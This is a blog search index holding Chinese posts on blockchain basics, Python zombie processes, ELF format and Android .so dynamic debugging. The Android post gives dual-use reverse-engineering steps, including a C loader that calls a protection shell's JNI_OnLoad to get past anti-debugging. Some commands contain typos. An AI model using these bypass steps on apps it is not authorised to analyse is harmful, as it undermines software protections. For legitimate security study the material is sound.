<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[小说区块链2.0-智能合约]]></title>
      <url>https://nanshihui.github.io/2018/08/18/%E5%8C%BA%E5%9D%97%E9%93%BE2-0-%E4%BB%A5%E5%A4%AA%E5%9D%8A/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>在本文之前已经对区块链1.0–比特币进行简单的阐述，空闲之余对以太坊的相关材料进行整理，最后以通俗的方式讲述区块链2.0相关技术。<p></p>
<h3 id="u5173_u4E8E_u667A_u80FD_u5408_u7EA6_u7684_u7EC6_u8282_u8BF4_u660E"><a href="#u5173_u4E8E_u667A_u80FD_u5408_u7EA6_u7684_u7EC6_u8282_u8BF4_u660E" class="headerlink" title="关于智能合约的细节说明"></a>关于智能合约的细节说明</h3><ul>
<li><strong>比特币的优缺陷:</strong>比特币有那些优缺陷</li>
<li><strong>区块链1.0和区块链2.0之间的差异:</strong> 区块链1.0和区块链2.0之间的差异</li>
<li><strong>智能合约:</strong>什么是智能合约</li>
<li><strong>应用:</strong> 基于以太坊的相关应用</li>
</ul>
<a id="more"></a>
<h2 id="u7B80_u4ECB"><a href="#u7B80_u4ECB" class="headerlink" title="简介"></a>简介</h2><p>　　近期国内主流互联网公司纷纷推出基于区块链的相关产品。因此，本文对当下比较火热的区块链2.0技术–智能合约，进行相关整理，并以白话的方式对整个差异进行阐述。因之前对区块链1.0略有所了解，我们在理解智能合约上会更加容易一些。</p>
<h2 id="u6BD4_u7279_u5E01_u7684_u4F18_u7F3A_u9677"><a href="#u6BD4_u7279_u5E01_u7684_u4F18_u7F3A_u9677" class="headerlink" title="比特币的优缺陷"></a>比特币的优缺陷</h2><p>　　通过之前的文章我们可以知道，比特币作为一种点对点的电子现金系统，相对于传统货币具有如下几个优势：</p>
<ul>
<li>数字货币：比特币是一种数字货币，通过网络来支付，相比纸币等传统货币具有很大的灵活性。</li>
<li>点对点支付：比特币可以像纸币一样进行点对点支付，无需可信的第三方介入。</li>
<li>防止双重支付：传统的数字货币难以在没有可信第三方的情况下防止双重支付。</li>
<li>交易记录不可更改：交易一旦成功，就永远无法撤销或更改，保障收款方的利益。<br>　　然而比特币也有不少缺点：</li>
<li>资源消耗大：需要大量的计算机进行计算</li>
<li>比特币数量有上限：比特币数量上限为2100w，超过这个数值后，不会产生新的比特币</li>
<li>转账确认时间长：比特币钱包初次安装时，会消耗大量时间下载历史交易数据块。而比特币交易时，为了确认数据准确性，会消耗一些时间，与p2p网络进行交互，得到全网确认后，交易才算完成。</li>
</ul>
<p>　　不可避免，因为比特币的一些缺陷，技术爱好者们，对区块链1.0进行改进，因而就有了2.0版本。</p>
<h2 id="u533A_u5757_u94FE1-0_u548C_u533A_u5757_u94FE2-0_u4E4B_u95F4_u7684_u5DEE_u5F02"><a href="#u533A_u5757_u94FE1-0_u548C_u533A_u5757_u94FE2-0_u4E4B_u95F4_u7684_u5DEE_u5F02" class="headerlink" title="区块链1.0和区块链2.0之间的差异"></a>区块链1.0和区块链2.0之间的差异</h2><p>　　相较于区块链2.0，区块链1.0虽然有脚本支持，但是也有不少诟病：</p>
<ul>
<li>缺少图灵完备。脚本不支持循环语句</li>
<li>价值盲区。UTXO脚本无法为账户额度提供精细的控制。</li>
<li>缺少中间状态。UTXO只能显示已花费或未花费两个状态。</li>
<li>区块链盲区。无法很好的利用UTXO的数据，如随机值，时间戳等来进行更多潜在衍生性的功能活动。</li>
</ul>
<p>　　而区块链2.0因其具有图灵完备的语言以及定位于平台，可以实现支持多种应用的场景，而受到大家的期待。在区块链1.0中，产生一个新块，需要耗费10多分钟，而区块链2.0仅仅需要十几秒就可以生成一个新块。<br>　　在整体上，区块链2.0多了一个账户的概念，并且账户分外部账户和内部账户。外部账户由私钥控制，而内部账户是由合约代码进行控制。<br>　　其账户的数据结构分三部分，分别是交易计数、以太币余额、以及合约代码。从交易数据结构上看，整个交易数据多了如下几个字段。<br><img src="//nanshihui.github.io/public/images/chain2.png" alt="交易数据结构图"><br>　　正是因为这些字段的支持，使得区块链2.0上的矿工维护的不仅仅是交易记录，而是维护的是所有账户的余额。</p>
<h2 id="u667A_u80FD_u5408_u7EA6"><a href="#u667A_u80FD_u5408_u7EA6" class="headerlink" title="智能合约"></a>智能合约</h2><p>　　区块链2.0的一个特性就是支持智能合约。那么什么是智能合约？</p>
<p>　　<strong>智能合约</strong>是由时间驱动，具有状态，获得多方承认的，运行在一个可信、共享的区块链账本之上的，且能够根据预设条件自动处理账本上资产的程序。他的核心优势就是利用程序算法替代人进行仲裁和执行合同。正是因为这种特性使得智能合约变相成为一个分布式的程序。能够对更多潜在的业务场景进行支持。</p>
<h2 id="u5E94_u7528"><a href="#u5E94_u7528" class="headerlink" title="应用"></a>应用</h2><p>　　目前区块链2.0在金融类场景的应用较多，如广为认知的各种货币。除此之外还有对冲合约、储蓄钱包、遗嘱、资产竞拍、 ICO 代币等；在非金融领域如在线投票、去中心化治理、域名注册、物流、供应链、医药追溯都有很好的支持。</p>
<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>　　本文仅仅从表面上，对区块链1.0和2.0进行大致的介绍。如果对具体的技术感兴趣，可以阅读源码以及相关白皮书进行了解。随着技术不断的升级，智能合约也会增加更多的功能和特性，而近一个月区块链3.0技术–EOS，也已经面世，相信区块链技术在可信方面方便人的同时，也创造更多的可能。</p>
]]></content>
      
        <categories>
            
            <category> 区块链 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> 以太坊 </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[小说区块链1.0-比特币]]></title>
      <url>https://nanshihui.github.io/2018/03/16/blockchain-1-0-%E6%AF%94%E7%89%B9%E5%B8%81/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>近一年，随处可见各种新闻媒体甚至我隔壁的阿姨都在讨论区块链，于此同时，我们也看到比特币创造的神话。数字的虚拟货币的价值这么巨大，从当初的无人问津到现在的一币千金。<p></p>
<h3 id="u5173_u4E8E_u6BD4_u7279_u5E01_u7684_u7EC6_u8282_u8BF4_u660E"><a href="#u5173_u4E8E_u6BD4_u7279_u5E01_u7684_u7EC6_u8282_u8BF4_u660E" class="headerlink" title="关于比特币的细节说明"></a>关于比特币的细节说明</h3><ul>
<li><strong>矿工的工作流程:</strong>矿工的生命周期</li>
<li><strong>工作量证明:</strong>矿工是如何挖到新块</li>
<li><strong>交易:</strong> 矿工之间的交易是怎么样的</li>
<li><strong>激励:</strong> 如何促使旷工这么积极的干活</li>
<li><strong>其他:</strong> 区块链1.0的应用方向</li>
</ul>
<a id="more"></a>
<h2 id="u7B80_u4ECB"><a href="#u7B80_u4ECB" class="headerlink" title="简介"></a>简介</h2><p>　　最近出于好奇，对网上比特币的信息弄的云里雾里，于是开始对比特币的相关原理进行深入研究。除了对比特币的叹服之外，更多的是对中本聪的钦佩，对人性的洞察力。<br>　　在阅读下文之前，极力推荐大家看一下比特币的白皮书，通过白皮书，能够快速大致的了解，比特币是什么样的东西。如果感觉看英文太麻烦，本文将以通俗易懂的方式，来阐述区块链的1.0版本–比特币。<br>　　<strong>区块链</strong>：区块链（Blockchain）是由节点参与的分布式数据库系统。不可更改，不可伪造，也可以将其理解为账簿系统(ledger)。其具有完整比特币区块链的备份，记录了其代币（token）的每一笔交易。通过这些信息，我们可以找到每一个地址，在历史上任何一点所拥有的价值。<br>　　比特币是电子货币，而区块链只是比特币系统用来记录交易信息的账簿，其具有如下特征：</p>
<ul>
<li>去中心化。由于使用分布式核算和存储，不存在中心化的硬件或管理机构，任意节点的权利和义务都是均等的，系统中的数据块由整个系统中具有维护功能的节点来共同维护。</li>
<li>开放性。系统是开放的，除了交易各方的私有信息被加密外，区块链的数据对所有人公开，任何人都可以通过公开的接口查询区块链数据和开发相关应用，因此整个系统信息高度透明。</li>
<li>自治性。区块链采用基于协商一致的规范和协议（比如一套公开透明的算法）使得整个系统中的所有节点能够在去信任的环境自由安全的交换数据，使得对“人”的信任改成了对机器的信任，任何人为的干预不起作用。 </li>
<li>信息不可篡改。一旦信息经过验证并添加至区块链，就会永久的存储起来，除非能够同时控制住系统中超过51%的节点，否则单个节点上对数据库的修改是无效的，因此区块链的数据稳定性和可靠性极高。</li>
<li>匿名性。由于节点之间的交换遵循固定的算法，其数据交互是无需信任的（区块链中的程序规则会自行判断活动是否有效），因此交易对手无须通过公开身份的方式让对方自己产生信任，对信用的累积非常有帮助。<br>　　从整体上看比特币的产生、消费、流转，都离不开比特币矿工的支持。下面讲着重讲解矿工的工作流程。</li>
</ul>
<h2 id="u77FF_u5DE5_u7684_u5DE5_u4F5C_u6D41_u7A0B"><a href="#u77FF_u5DE5_u7684_u5DE5_u4F5C_u6D41_u7A0B" class="headerlink" title="矿工的工作流程"></a>矿工的工作流程</h2><p>　　挖矿即不断接入新的Block延续Block Chain的过程。<br><img src="//nanshihui.github.io/public/images/bitcoin.png" alt="矿工分布图"><br>　　从图中我们可以看出整个区块链网络，有很多角色组成。而最主要的角色是矿工。挖矿为整个系统的运转提供原动力，是比特币的发动机，没有挖矿就没有比特币。<br>　　挖矿有三个重要功能：</p>
<ul>
<li>发行新的货币（总量达到之前）</li>
<li>维系货币的支付功能</li>
<li>通过算力保障系统安全<br>　　从下图我们便可以直观的感受到一个矿工的生命周期。<br><img src="//nanshihui.github.io/public/images/bitworker.png" alt="矿工工作内容图"></li>
</ul>
<h2 id="u5DE5_u4F5C_u91CF_u8BC1_u660E"><a href="#u5DE5_u4F5C_u91CF_u8BC1_u660E" class="headerlink" title="工作量证明"></a>工作量证明</h2><p>　　工作量证明过程主要含如下四个步骤：</p>
<ul>
<li>将一段时间内的交易放入一个区块中</li>
<li>通过不断改变区块中的随机数，来尝试碰撞出一个符合要求的区块散列值</li>
<li>一旦找到符合要求的散列值，即认为完成了一次工作量证明，该区块中的交易将被记录在账本中</li>
<li>将上一个区块的散列值放入下一个区块中，形成一个链条（区块链）</li>
</ul>
<p>　　而第一个计算出符合要求的区块链散列值的矿工，也就意味着他挖到了新的比特币。</p>
<h2 id="u4EA4_u6613"><a href="#u4EA4_u6613" class="headerlink" title="交易"></a>交易</h2><p>　　在比特币网络中，交易不像传统的转账方式，将钱和人严格绑定。更多的是提出问题和回答问题的过程。提出问题相当于发出一定数量的比特币，而只有回答正确这个问题的人，才能获得这个比特币。所以在比特币转账中，转账发起人，要注明被转账人的公钥，而只有被转账人的私钥才能解开这个问题。如下图，就是一个具体交易过程所采用的验证方式和过程。</p>
<p><img src="//nanshihui.github.io/public/images/transaction.png" alt="交易验证图"><br>　　在交易的过程中，除了填写被转账人的公钥hash值外，还要证明转账人的钱是来源哪里，并且要证明这些钱是合法的，这笔交易才会生效。<br><img src="//nanshihui.github.io/public/images/utxo.png" alt="UTXO图"></p>
<h2 id="u6FC0_u52B1"><a href="#u6FC0_u52B1" class="headerlink" title="激励"></a>激励</h2><p>　　从以上几个方面，我们可以知晓，矿工在区块链中扮演的地位。然而为什么矿工会这么主动的做这些事情？<br>　　其实，矿工在挖矿的过程中，一旦矿工计算出一个新块的hash值，他就会获得比特币。此外每一笔交易，都会有交易费，而这个交易费，就归属于矿工。一个区块存，存储的是这一个区块时间的交易记录。矿工只有不断的去计算出hash值，才能获得更多的比特币。另外为了能获得更多的交易费，矿工节点倾向于选择交易费高，且数据量占用小的交易。</p>
<h2 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h2><p>　　目前在区块链方面的应用已经有不少。如：</p>
<ul>
<li>物流追溯</li>
<li>版权保护：数字制品的每次交易都记录到区块链里，做为正版证明。由于纪录不可修改，用户私钥的保密性，完全可以证明用户对该数字产品的拥有权，使用权，分享权。</li>
<li>智能合约：比特币可以在一定程度上实现智能合约。此时，接收比特币的收款地址将是一个合约脚本的散列值，而不是公钥的散列值；而验证合约地址发出的交易，需要执行合约的脚本内容。</li>
<li>分布式DNS解析服务器<br>　　以上的这些应用都是围绕区块链不可篡改的特性，进行应用，而区块链1.0也有其弊端，如需要耗费巨大的计算资源。因此在下文，笔者会以通俗的方式阐述区块链的升级版本，区块链2.0–以太坊.</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 区块链 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> 比特币 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python相关僵尸进程问题避免]]></title>
      <url>https://nanshihui.github.io/2017/08/20/python-zombie-process/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>在使用Python的过程中,偶然发现进程列表出现一些defunct的字样,于是开始摸索是哪里出现问题。<br><a id="more"></a><p></p>
<h2 id="u50F5_u5C38_u8FDB_u7A0B"><a href="#u50F5_u5C38_u8FDB_u7A0B" class="headerlink" title="僵尸进程"></a>僵尸进程</h2><p>　　僵尸进程，顾名思义，就是已经死去没有意义的进程。即⼦进程运⾏完成，但是⽗进程迟迟没有进⾏回收，此时⼦进程实际上并没有退出，其仍然占⽤着系统资源，这样的⼦进程称为僵⼫进程。<br>　　因为僵⼫进程的资源⼀直未被回收，造成了系统资源的浪费，过多的僵⼫进程将造成系统性能下降，所以应避免出现僵⼫进程。将时间<br><br></p>
<h3 id="u4EA7_u751F_u50F5_u5C38_u8FDB_u7A0B_u7684_u60C5_u51B5"><a href="#u4EA7_u751F_u50F5_u5C38_u8FDB_u7A0B_u7684_u60C5_u51B5" class="headerlink" title="产生僵尸进程的情况"></a>产生僵尸进程的情况</h3><ul>
<li>如果父进程先退出<br>子进程自动被 init 进程收养，不会产生僵尸进程</li>
<li>如果子进程先退出<br><strong>如果父进程 wait() 处理</strong> ，则僵尸进程会被父进程清理<br><strong>如果父进程不用wait()处理</strong>，则僵尸进程会在父进程退出之前一直存在。当然，父进程退出后，僵尸子进程会被 init 收养，init 进程会自动调用 wait() 处理。但是对于处理网络请求的服务器进程来说，父进程可能会一直存在，子进程处理完任务就退出，这种情况下会产生很多僵尸进程，这种场景就需要对僵尸进程的处理提高警惕了。</li>
</ul>
<p><br></p>
<h3 id="u5982_u4F55_u907F_u514D_u4EA7_u751F_u50F5_u5C38_u8FDB_u7A0B"><a href="#u5982_u4F55_u907F_u514D_u4EA7_u751F_u50F5_u5C38_u8FDB_u7A0B" class="headerlink" title="如何避免产生僵尸进程"></a>如何避免产生僵尸进程</h3><ul>
<li>推荐方法：fock twice, 用孙子进程去完成子进程的任务（注意这种方法的使用情景）</li>
<li>wait(), 但是会使父进程阻塞</li>
<li>signal(SIGCHLD,SIG_IGN), 并不是所有系统都兼容<br>即主进程程序中加入一句<code>import signalsignal.signal(signal.SIGCHLD,signal.SIG_IGN)</code></li>
<li>sigaction + SA_NOCLDWAIT, 并不是所有系统都兼容</li>
<li>在signal handler中调用 waitpid ，这样父进程不用阻塞。</li>
</ul>
<p>注意：每一种方法都有它适用的场合，比如最后一种方法适用于 one-request-one-process 的网络服务器程序，而方法 1 则不适合。</p>
<p>　　在使用subprocess 模块的 Popen 调用外部程序时，如果调用命令，没有去等待，就会产生僵尸进程，即使你有异常捕获函数。通常我们会在调用命令之后会调用wait()函数。 这里比较推荐的做法是使用communicate（）函数，而不是wait()函数。因为wait()函数，如果 stdout 或 stderr 参数是 pipe，并且程序输出超过操作系统的 pipe size时，使用Popen.wait()方式等待程序结束获取返回值，会导致死锁，程序卡在 wait() 调用上。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 僵尸进程 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Adnroid so文件动态调试技巧]]></title>
      <url>https://nanshihui.github.io/2017/05/05/%E5%AE%89%E5%8D%93so%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>android的so文件调试,网上写了不少,但是按着网上来,却不一定是正确的,于是自己便总结了一份,给需要的人,同时也方便自己查阅。<p></p>
<h3 id="SO_u52A8_u6001_u8C03_u8BD5_u6280_u5DE7"><a href="#SO_u52A8_u6001_u8C03_u8BD5_u6280_u5DE7" class="headerlink" title="SO动态调试技巧"></a>SO动态调试技巧</h3><ul>
<li><strong>SO加载流程</strong> </li>
<li><strong>调试前奏:</strong> 在调试前需要那些工具</li>
<li><strong>调试流程:</strong> 调试的相关细节</li>
</ul>
<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　随着攻防对抗的升级，或者是java没有相应的API函数，需要借助更底层的函数来支撑，也就有了JNI技术，让JAVA可以调用其他语言封装的库函数，在ANDROID上，也有对应的NDK技术，因此在调试之前，我们最好先了解JNI的相关技术,这样寻找问题的时候定位会更加快.比如常见的断点处。</p>
<h2 id="SO_u52A0_u8F7D_u6D41_u7A0B"><a href="#SO_u52A0_u8F7D_u6D41_u7A0B" class="headerlink" title="SO加载流程"></a>SO加载流程</h2><p>　　so文件在加载的时候，粗略的流程，通常会经过 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.init-&#62;-&#62;.init array-&#62;-&#62;JNI_Onload-&#62;-&#62;java_com_XXX;</span><br></pre></td></tr></table></figure></p>
<p> 这几个步骤，根据断点的位置,可以初步划分为如下几种：</p>
<ul>
<li>应用级：java_com_XXX；</li>
<li>外壳级：JNI_Onload,.init,.init_array;</li>
<li>系统级：fopen,fget,dvmdexfileopen；</li>
</ul>
<p>　　.init和.init array常做为壳的入口，对于so反调试的情况，可以在这两个函数上下断点，而对于应用具体的函数调用就会在相应的<br>特殊情况下文会细述。函数下断点，而对于加壳函数不管怎么操作，最后都会去读取dex文件或者其他文件，那就需要系统函数，那在系统函数上下断点就显得有必要。</p>
<h2 id="u8C03_u8BD5_u51C6_u5907"><a href="#u8C03_u8BD5_u51C6_u5907" class="headerlink" title="调试准备"></a>调试准备</h2><p>　　调试的时候我们需要的工具有IDA，APKtool，adb，常见的工具可以在这里<a href="https://github.com/nanshihui/Android-reverse-tool" target="_blank" rel="external">https://github.com/nanshihui/Android-reverse-tool</a>获得</p>
<h2 id="u8C03_u8BD5_u6D41_u7A0B"><a href="#u8C03_u8BD5_u6D41_u7A0B" class="headerlink" title="调试流程"></a>调试流程</h2><p>　　在调试的时候，确保apk的AndroidManifest.xml文件中android:debuggable=”true”字段为true。如果不是的话，可以先解包修改，然后再打包签名。</p>
<h3 id="u6DFB_u52A0android_server"><a href="#u6DFB_u52A0android_server" class="headerlink" title="添加android_server"></a>添加android_server</h3><p>　　需要在一个root手机上或者是模拟器上，添加一个android_server文件，这个文件来源于ida的dbgsrv文件夹。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb push d:\android_server（IDA的dbgsrv目录下）  /data/<span class="built_in">local</span>/tmp/android_server（这个目录其实可以随便放，有的反调试会检测这)</span><br><span class="line">adb shell</span><br><span class="line">su(一定要有root权限)</span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod <span class="number">777</span> android_server(执行权限要给)</span><br></pre></td></tr></table></figure></p>
<h3 id="u542F_u52A8_u7AEF_u53E3_u8F6C_u53D1"><a href="#u542F_u52A8_u7AEF_u53E3_u8F6C_u53D1" class="headerlink" title="启动端口转发"></a>启动端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./android_server</span><br></pre></td></tr></table></figure>
<p>　　重新打开一个窗口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:<span class="number">23946</span> tcp:<span class="number">23946</span></span><br><span class="line">adb shell am start -D -n 包名/类名；<span class="comment">#包名和类名，可以在AndroidManifest.xml里找到</span></span><br></pre></td></tr></table></figure></p>
<p>　　打开IDA，加载需要的so文件，并设置好断点，点击debugger，选择attch to process选择对应的进程。在debug option勾选suspend on process entry point，suspend on thread start/exit，suspend on library load/unload.</p>
<h3 id="u542F_u52A8JDWP_u7AEF_u53E3_u8F6C_u53D1"><a href="#u542F_u52A8JDWP_u7AEF_u53E3_u8F6C_u53D1" class="headerlink" title="启动JDWP端口转发"></a>启动JDWP端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forword tcp:<span class="number">8700</span> jdwp:进程号 <span class="comment">#可通过ps|grep 进程名  查找</span></span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=<span class="number">127.0</span>.<span class="number">0.1</span>,port=<span class="number">8700</span></span><br></pre></td></tr></table></figure>
<h3 id="IDA_u8C03_u8BD5"><a href="#IDA_u8C03_u8BD5" class="headerlink" title="IDA调试"></a>IDA调试</h3><p>　　通过以上步骤，在IDA界面按F9执行，程序将会在相应的断点停下，然后可以按f8进行单步调试。<br>如果之前没有断点，可以计算基地址和so代码的相对地址，通过跳转并添加断点（按F2），基地址可以通过<br>基地址为：ctrl+s显示对应的so模块地址，相对地址，可以通过静态加载so取得。</p>
<h2 id="u7279_u6B8A_u60C5_u51B5"><a href="#u7279_u6B8A_u60C5_u51B5" class="headerlink" title="特殊情况"></a>特殊情况</h2><h3 id="u6A21_u62DF_u673A_u65E0_u6CD5_u4F7F_u7528android_server"><a href="#u6A21_u62DF_u673A_u65E0_u6CD5_u4F7F_u7528android_server" class="headerlink" title="模拟机无法使用android_server"></a>模拟机无法使用android_server</h3><p>　　在使用模拟器的时候，由于是x86架构，无法启动android_server,这时候可以使用gbdserver一样可以调试</p>
<h3 id="so_u6587_u4EF6_u53CD_u8C03_u8BD5"><a href="#so_u6587_u4EF6_u53CD_u8C03_u8BD5" class="headerlink" title="so文件反调试"></a>so文件反调试</h3><p>　　如果下断点，无法越过so文件的反调试，可以通过自己写代码加载so对应的函数绕过。调用JNI_Onload代码如下所示。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    JavaVM* vm;</span><br><span class="line">    JNIEnv* env;</span><br><span class="line">    jint res;</span><br><span class="line">     </span><br><span class="line">    JavaVMInitArgs vm_args;</span><br><span class="line">    JavaVMOption options[<span class="number">1</span>];</span><br><span class="line">    options[<span class="number">0</span>].optionString = <span class="string">"-Djava.class.path=."</span>;</span><br><span class="line">    vm_args.version=<span class="number">0x00010002</span>;</span><br><span class="line">    vm_args.options=options;</span><br><span class="line">    vm_args.nOptions =<span class="number">1</span>;</span><br><span class="line">    vm_args.ignoreUnrecognized=JNI_TRUE;</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] dlopen libdvm.so\n"</span>);</span><br><span class="line">    <span class="keyword">void</span> *handle = dlopen(<span class="string">"/system/lib/libdvm.so"</span>, RTLD_LAZY);<span class="comment">//RTLD_LAZY RTLD_NOW</span></span><br><span class="line">    <span class="keyword">if</span>(!handle)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] dlopen libdvm.so failed!!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里我先创建一个java虚拟机。因为JNI_ONload函数参数第一个参数为JavaVM。</span></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*JNI_CreateJavaVM_Type)</span><span class="params">(JavaVM**, JNIEnv**, <span class="keyword">void</span>*)</span></span>;</span><br><span class="line">    JNI_CreateJavaVM_Type JNI_CreateJavaVM_Func = (JNI_CreateJavaVM_Type)dlsym(handle, <span class="string">"JNI_CreateJavaVM"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!JNI_CreateJavaVM_Func)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] dlsym failed\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res=JNI_CreateJavaVM_Func(&amp;vm,&amp;env,&amp;vm_args)</span><br><span class="line">    <span class="keyword">void</span>* si=dlopen(<span class="string">"/data/local/tmp/libbaiduprotect.so"</span>,RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span>(si == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] dlopen err!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">jint</span> <span class="params">(*FUN)</span><span class="params">(JavaVM* vm,<span class="keyword">void</span>* res)</span></span>;</span><br><span class="line">    FUN func_onload=(FUN)dlsym(si,<span class="string">"JNI_OnLoad"</span>);</span><br><span class="line">    <span class="keyword">if</span>(func_onload==<span class="literal">NULL</span>)<span class="comment">//我将断点下在了这里可以正好获取到JNI_Onload的函数地址。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    func_onload(vm,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>　　通过这样的方法可以绕过。当然反调试的情况不止这一种，将会在下篇中继续添加。</p>
]]></content>
      
        <categories>
            
            <category> 移动安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ELF文件分析]]></title>
      <url>https://nanshihui.github.io/2017/04/12/ELF%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>由于Android中的so文件就是elf文件，所以想要了解so文件，必须先了解elf文件的格式，网上虽然ELF格式的分析不少,但是感觉不透彻,便耐着性子,慢慢开始了elf格式分析。<p></p>
<h3 id="ELF_u683C_u5F0F_u5206_u6790"><a href="#ELF_u683C_u5F0F_u5206_u6790" class="headerlink" title="ELF格式分析"></a>ELF格式分析</h3><ul>
<li><strong>ELF:</strong> 什么是ELF</li>
<li><strong>ELF结构:</strong> 详细的ELF数据结构</li>
</ul>
<a id="more"></a>
<h2 id="u5F15_u8A00"><a href="#u5F15_u8A00" class="headerlink" title="引言"></a>引言</h2><p>　　ELF(Executable and Linkable Format)即可执行连接文件格式，是一种比较复杂的文件格式，但其应用广泛。与linux下的其他可执行文件(a.out，cof)相比，它对节的定义和gnu工具链对它的支持使它十分灵活，它保存的足够了系统相关信息使它能支持不同平台上的交叉编译和交叉链接，可移植性很强．同时它在执行中支持动态链接共享库。</p>
<p>目标文件有三种类型:</p>
<ul>
<li>可重定位文件(Relocatable File) .o)包含适合于与其他目标文件链接来创建可执行文件或者共享目标文件的代码和数据。</li>
<li>可执行文件(Executable File) .exe) 包含适合于执行的一个程序，此文件规定了exec() 如何创建一个程序的进程映像。</li>
<li>共享目标文件(Shared Object File) .so) 包含可在两种上下文中链接的代码和数据。首先链接编辑器可以将它和其它可重定位文件和共享目标文件一起处理， 生成另外一个目标文件。其次动态链接器(Dynamic Linker)可能将它与某 个可执行文件以及其它共享目标一起组合，创建进程映像。</li>
</ul>
<p>目标文件全部是程序的二进制表示，目的是直接在某种处理器上直接执行。</p>
<h2 id="ELF_u7EC4_u6210"><a href="#ELF_u7EC4_u6210" class="headerlink" title="ELF组成"></a>ELF组成</h2><p>　　ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，而且他们的位置也未必如同所示这样安排，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定.</p>
